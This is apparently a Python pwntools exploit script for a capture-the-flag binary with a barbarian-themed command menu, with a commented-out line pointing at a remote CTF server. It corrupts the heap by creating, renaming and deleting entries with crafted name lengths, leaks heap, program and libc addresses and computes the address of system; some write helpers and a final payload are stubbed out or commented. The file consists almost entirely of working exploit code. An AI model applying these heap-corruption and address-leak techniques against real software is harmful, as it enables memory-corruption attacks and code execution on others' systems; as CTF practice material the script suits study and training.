#!/usr/bin/python
from pwn import *
class mypwn(object):
	def __init__(self):
		self.io=process("./sg")
		self.elf=ELF("./libc")
		#self.io=remote("202.120.7.107",60008)
		self.system_offset=self.elf.symbols['system']

	def debug(self):
		sc='heap -l\n'
		pwnlib.gdb.attach(self.io,sc)

	def new_barbarian(self,name):
		cmd='new barbarian '
		cmd+=name
		self.io.sendline(cmd)
		time.sleep(0.2)
	def chg_name(self,old,new):
		cmd='change '
		cmd+=old
		cmd+=' '
		cmd+=new
		self.io.sendline(cmd)

	def delete(self,name):
		cmd='delete '
		cmd+=name
		self.io.sendline(cmd)
		time.sleep(0.2)
		pass

	def leak(self):
		cmd='print all'
		self.io.sendline(cmd)
		self.io.recvuntil("a"*0x200)
		content=self.io.recvuntil("\n")[:-1]
		addr=0
		rate=1
		for t in content:
			addr+=rate*ord(t)
			rate*=256
		self.bar_addr=addr
		self.code_addr=self.bar_addr-0x203c28
		self.io.recvuntil("Bshrink\n")
		self.io.recvuntil("magic: ")
		self.libc_addr=int(self.io.recvuntil("\n"))
		self.libc_addr*=0x100000000
		self.io.recvuntil("life: ")
		self.libc_addr+=int(self.io.recvuntil("\n"))-0x68
		print "malloc_hook :"+hex(self.libc_addr)
		self.libc_addr-=self.elf.symbols['__malloc_hook']
		self.io.recvuntil("smartness: 2\n")
		print "code_addr   :"+hex(self.code_addr)
		print "libc_addr   :"+hex(self.libc_addr)
		print "system_addr :"+hex(self.libc_addr+self.system_offset)

	def write(self,addr,data):
		self.chg_name("f"*0xe1,0xe0*"f"+p64(addr))
		#self.chg_name("")
		pass

	def goto_address_at(self,ptr):
		pass
		self.chg_name("subway","a"*0x200+p64(ptr))
		self.io.sendline("print all")

	def run(self):
		pass
		self.new_barbarian("a"*0xf)
		self.new_barbarian("b"*0xf)
		self.new_barbarian("c"*0xf7)
		self.chg_name("B"+"b"*0xf,0x378*"b")
		self.new_barbarian("d"*0xf) #0x890
		self.new_barbarian("e"*0xf) #0x990
		self.new_barbarian("f"*0xf) #0xa90
		self.new_barbarian("g"*0xf) #0xa90
		self.delete(0x378*"b")
		self.delete("B"+"c"*0xf7)
		self.new_barbarian("b"*0x77)
		self.new_barbarian("c"*0x77+"A")
		self.chg_name("B"+0xf*"e","e"*0x1f0)
		self.new_barbarian("shrink") #0x710
		self.delete("e"*0x1f0)
		self.delete("B"+"d"*0xf)
		self.chg_name("B"+0xf*"a",0x200*"a"+chr(0x28))
		self.leak()
		self.io.interactive()
		return 
		#self.chg_name(0x200*"a"+chr(0x28),"subway")
		#self.chg_name("B"+0xf*"f",0xe0*"f"+chr(0xa0))
		#self.debug()

		#payload="print all       "
		#payload+=p64(self.libc_addr)*0x10
		#self.io.sendline(payload)


p=mypwn()
p.run()